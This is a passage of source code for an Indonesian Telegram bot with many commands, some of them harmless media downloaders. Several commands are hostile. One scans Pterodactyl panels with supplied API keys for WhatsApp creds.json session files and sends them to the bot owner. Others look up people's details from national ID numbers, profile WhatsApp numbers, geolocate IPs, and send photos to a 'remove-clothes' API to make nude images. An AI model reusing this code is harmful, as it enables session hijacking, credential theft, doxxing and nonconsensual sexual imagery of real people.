🎭 Type: ${anime.type}
📺 Source: ${anime.source}

📖 <b>Sinopsis:</b>
${anime.synopsis ? anime.synopsis.substring(0, 500) + '...' : 'Tidak tersedia'}

🔗 <a href="${anime.url}">MyAnimeList</a>`;

        await ctx.replyWithVideo(anime.images.jpg.large_image_url, {
            caption: caption,
            parse_mode: "HTML",
            disable_web_page_preview: true
        });

    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mencari anime");
    } finally {
        try { await ctx.deleteMessage(waitMsg.message_id); } catch {}
    }
});


bot.command("cekbiotele", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    
    if (args.length < 1 && !ctx.message.reply_to_message) {
        return ctx.reply("📝 Format: /cekbio <username|user_id|reply>\nContoh: /cekbio @username\n/cekbio 123456789\n/cekbio [reply user]");
    }

    let targetUser;
    const processMsg = await ctx.reply("⏳ Mengambil informasi bio...");

    try {
        // Determine target user
        if (ctx.message.reply_to_message) {
            targetUser = ctx.message.reply_to_message.from;
        } else if (args[0].startsWith('@')) {
            const username = args[0].slice(1);
            targetUser = await ctx.telegram.getChat(`@${ctx.from.first_name}`);
        } else {
            const userId = parseInt(args[0]);
            if (isNaN(userId)) {
                await ctx.editMessageText("❌ User ID atau username tidak valid", {
                    chat_id: ctx.chat.id,
                    message_id: processMsg.message_id
                });
                return;
            }
            targetUser = await ctx.telegram.getChat(userId);
        }

        // Get user profile photos for avatar
        const profilePhotos = await ctx.telegram.getUserProfilePhotos(targetUser.id, 0, 1);
        
        // Get full user info
        const userInfo = await formatUserBio(targetUser, profilePhotos);

        // Send result
        if (profilePhotos.total_count > 0) {
            const photoFile = await ctx.telegram.getFile(profilePhotos.photos[0][0].file_id);
            const thumbnailUrl = `https://api.telegram.org/file/bot${ctx.telegram.token}/${photoFile.file_path}`;
            
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: userInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }],
                        [{ text: "🔄 Scan Ulang", callback_data: `rescan_bio_${targetUser.id}` }]
                    ]
                }
            });
        } else {
            await ctx.reply(userInfo, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📊 Info Lengkap", callback_data: `fullinfo_${targetUser.id}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Bio check error:", error);
        await ctx.editMessageText("❌ Gagal mengambil informasi user. Pastikan username/userID valid dan user tidak di-private.", {
            chat_id: ctx.chat.id,
            message_id: processMsg.message_id
        });
    }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
        // Menggunakan Baileys untuk mendapatkan info kontak
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }

        // Mendapatkan detail kontak
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <b>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</b>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

        // Hapus pesan proses
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

bot.command("cekkontak", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekkontak 62×××\nContoh: /cekkontak 628123456789");
    }

    const number = args[1];
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const target = cleanNumber + "@s.whatsapp.net";

    const processMsg = await ctx.reply("⏳ ☇ Memeriksa kontak WhatsApp...");

    try {
        // Cek apakah nomor terdaftar di WhatsApp
        const contactCheck = await sock.onWhatsApp(target);
        
        if (!contactCheck || contactCheck.length === 0) {
            await ctx.editMessageText(
                `❌ ☇ Nomor ${number} tidak terdaftar di WhatsApp`,
                { chat_id: ctx.chat.id, message_id: processMsg.message_id }
            );
            return;
        }

        const contact = contactCheck[0];
        
        // Dapatkan info profil lengkap
        let profilePicture = null;
        let status = null;
        let businessProfile = null;

        try {
            profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        } catch (e) {}

        try {
            status = await sock.fetchStatus(target).catch(() => null);
        } catch (e) {}

        try {
            businessProfile = await sock.getBusinessProfile(target).catch(() => null);
        } catch (e) {}

        // Format hasil
        let contactInfo = `<blockquote><b>⬡═―—⊱ ⎧ WHATSAPP CONTACT INFO ⎭ ⊰―—═⬡</b></blockquote>\n\n`;
        
        contactInfo += `📱 <b>Informasi Kontak</b>\n\n`;
        contactInfo += `🔢 <b>Nomor:</b> +${cleanNumber}\n`;
        contactInfo += `✅ <b>Status WhatsApp:</b> Terdaftar\n`;
        
        if (contact.exists) {
            contactInfo += `🟢 <b>Akun Aktif:</b> Ya\n`;
        }

        if (status) {
            contactInfo += `📝 <b>Status/Bio:</b> ${status.status || 'Tidak ada'}\n`;
            if (status.setAt) {
                contactInfo += `⏰ <b>Status Diubah:</b> ${new Date(status.setAt).toLocaleString('id-ID')}\n`;
            }
        }

        if (businessProfile) {
            contactInfo += `🏢 <b>Akun Bisnis:</b> Ya\n`;
            contactInfo += `📊 <b>Kategori:</b> ${businessProfile.categories?.[0]?.name || 'Tidak diketahui'}\n`;
            contactInfo += `📋 <b>Deskripsi:</b> ${businessProfile.description || 'Tidak ada'}\n`;
            
            if (businessProfile.email) {
                contactInfo += `📧 <b>Email:</b> ${businessProfile.email}\n`;
            }
            if (businessProfile.website) {
                contactInfo += `🌐 <b>Website:</b> ${businessProfile.website}\n`;
            }
            if (businessProfile.address) {
                contactInfo += `📍 <b>Alamat:</b> ${businessProfile.address}\n`;
            }
        }

        contactInfo += `\n🖼 <b>Foto Profil:</b> ${profilePicture ? 'Tersedia' : 'Tidak tersedia'}\n`;
        contactInfo += `📞 <b>Chat:</b> <a href="https://wa.me/${cleanNumber}">Klik di sini</a>\n`;

        // Kirim hasil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "💬 Cek Grup", callback_data: `checkgroups_${cleanNumber}` }]
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: contactInfo,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📞 Chat WhatsApp", url: `https://wa.me/${cleanNumber}` }],
                        [{ text: "📊 Cek Detail", callback_data: `checkdetail_${cleanNumber}` }]
                    ]
                }
            });
        }

        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking contact:", error);
        await ctx.editMessageText(
            `❌ ☇ Gagal memeriksa kontak ${number}\nError: ${error.message}`,
            { chat_id: ctx.chat.id, message_id: processMsg.message_id }
        );
    }
});

bot.command("remove", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
  }

  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)

  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b> ⬡═―—⊱ ⎧ FAULET XBLAUD ⎭ ⊰―—═⬡ </b></blockquote>
𖤓 IP: ${data.ip || "-"}
𖤓 Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
𖤓 Region: ${data.region || "-"}
𖤓 City: ${data.city || "-"}
𖤓 ZIP: ${data.postal || "-"}
𖤓 Timezone: ${data.timezone_gmt || "-"}
𖤓 ISP: ${data.isp || "-"}
𖤓 Org: ${data.org || "-"}
𖤓 ASN: ${data.asn || "-"}
𖤓 Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

// Command /cekid
bot.command("cekid", async (ctx) => {
    const chatId = ctx.chat.id;
    
    try {
        // Ambil teks setelah command
        const text = ctx.message.text.split(" ").slice(1).join(" ");
        
        if (!text) {
            return ctx.reply("⚠ Gunakan: /cekid https://whatsapp.com/channel/xxxx");
        }

        if (!text.includes("whatsapp.com/channel/")) {
            return ctx.reply("❌ Link WhatsApp Channel tidak valid!");
        }

        let channelId = text.split("channel/")[1].split(/[/?]/)[0];
        let newsletterJid = channelId + "@newsletter";

        await ctx.reply(
`✅ Newsletter ID ditemukan:

${newsletterJid}`
        );

    } catch (err) {
        console.log(err);
        ctx.reply("Terjadi error saat proses.");
    }
});

bot.command("tiktok", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktok https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  // Validasi URL TikTok
  if (!url.match(/(tiktok\.com|vt\.tiktok\.com)/)) {
    return ctx.reply("❌ Link TikTok tidak valid!");
  }

  // Kirim pesan dengan button
  await ctx.reply(
    "📥 Pilih jenis download yang diinginkan:",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🎬 Video + Audio", callback_data: `tiktok_download|${url}|video` },
            { text: "🌟 HD (No Watermark)", callback_data: `tiktok_download|${url}|hd` }
          ],
          [
            { text: "🎵 Audio Saja", callback_data: `tiktok_download|${url}|audio` }
          ]
        ]
      }
    }
  );
});


// Fungsi download TikTok dengan berbagai tipe
async function downloadTikTok(url, type = 'video') {
  try {
    // Step 1: Ambil data video dari API
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data) {
      return { success: false, error: "Gagal ambil data video" };
    }

    const videoData = data.data;
    
    // Step 2: Pilih URL berdasarkan tipe
    let downloadUrl;
    
    if (type === 'audio') {
      // Ambil audio saja
      downloadUrl = videoData.music || videoData.music_info?.play_url;
      if (!downloadUrl) {
        return { success: false, error: "Audio tidak tersedia" };
      }
    } else if (type === 'hd') {
      // Prioritaskan video tanpa watermark (HD)
      downloadUrl = videoData.play || videoData.hdplay;
    } else {
      // Video standar (biasanya dengan watermark)
      downloadUrl = videoData.play || videoData.wmplay || videoData.hdplay;
    }

    if (!downloadUrl) {
      return { success: false, error: "URL download tidak ditemukan" };
    }
    const response = await axios.get(downloadUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    if (type === 'audio' && !downloadUrl.includes('.mp3')) {
    }

    return { 
      success: true, 
      data: response.data,
      type: type,
      size: response.data.length
    };

  } catch (error) {
    console.error("Download error:", error);
    return { 
      success: false, 
      error: error.response?.status 
        ? `Error ${error.response.status}`
        : "Koneksi timeout atau link salah"
    };
  }
}

// Helper function untuk nama tipe
function getTypeName(type) {
  const names = {
    'video': 'Video + Audio',
    'hd': 'HD No Watermark',
    'audio': 'Audio Saja'
  };
  return names[type] || type;
}

async function downloadFromAlternateAPI(url, type) {
  const apis = [
    "https://api.tikmate.app/api/lookup",
    "https://www.tikwm.com/api/"
  ];
  
  for (const api of apis) {
    try {
    } catch (error) {
      continue;
    }
  }
  
  throw new Error("Semua API gagal");
}

bot.command("igdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /igdl https://www.instagram.com/p/Cxample123/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video Instagram");

  try {
    // Alternative API - Instagram Downloader
    const { data } = await axios.get("https://api.igdownloader.com/api/ig", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*"
      },
      timeout: 20000
    });

    if (!data || data.error) {
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid dan publik");
    }

    const mediaUrl = data.result?.url || data.result;
    
    if (!mediaUrl) {
      return ctx.reply("❌ ☇ Tidak ada media yang bisa diunduh");
    }

    // Download media
    const media = await axios.get(mediaUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    // Cek tipe media dari Content-Type
    const contentType = media.headers['content-type'];
    const isVideo = contentType && contentType.startsWith('video');

    if (isVideo) {
      await ctx.replyWithVideo(
        { source: Buffer.from(media.data), filename: `ig_${Date.now()}.mp4` },
        { 
          supports_streaming: true,
          caption: "✅ Video Instagram berhasil didownload"
        }
      );
    } else {
      await ctx.replyWithPhoto(
        { source: Buffer.from(media.data) },
        { caption: "📷 Foto Instagram berhasil didownload" }
      );
    }

  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh media`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><b> ⬡═―—⊱ ⎧ FAULET XBLAUD ⎭ ⊰―—═⬡ </b></blockquote>
𖤓 NIK: ${get(d.nik) || nik}
𖤓 Nama: ${get(d.nama)}
𖤓 Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
𖤓 Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
𖤓 Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
𖤓 Umur: ${get(d.umur)}
𖤓 Provinsi: ${get(d.provinsi || d.province)}
𖤓 Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
𖤓 Kecamatan: ${get(d.kecamatan || d.district)}
𖤓 Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});



bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});


bot.command("toblur", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.photo)
    return ctx.reply("❌ Reply ke foto dulu!");

  try {
    const loading = await ctx.reply("⏳ Memproses blur...");

    const photo = reply.photo.at(-1);
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, "✅ Blur selesai, mengirim foto...");
    await ctx.replyWithPhoto({ url: `https://ikyyzyyrestapi.my.id/image/blur?url=${encodeURIComponent(fileLink.href)}` });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal memproses foto!");
  }
});

bot.command(["id"], async (ctx) => {
  try {
    let targetUser = null;
    let replyMsg = ctx.message.reply_to_message;
    
    // CEK APAKAH ADA YANG DI-REPLY
    if (replyMsg) {
      targetUser = replyMsg.from;
    } else {
      // CEK APAKAH ADA USERNAME YANG DIKASIH
      const args = ctx.message.text.split(" ");
      if (args.length > 1) {
        let username = args[1].replace("@", "");
        try {
          targetUser = await ctx.telegram.getChat(`@${username}`);
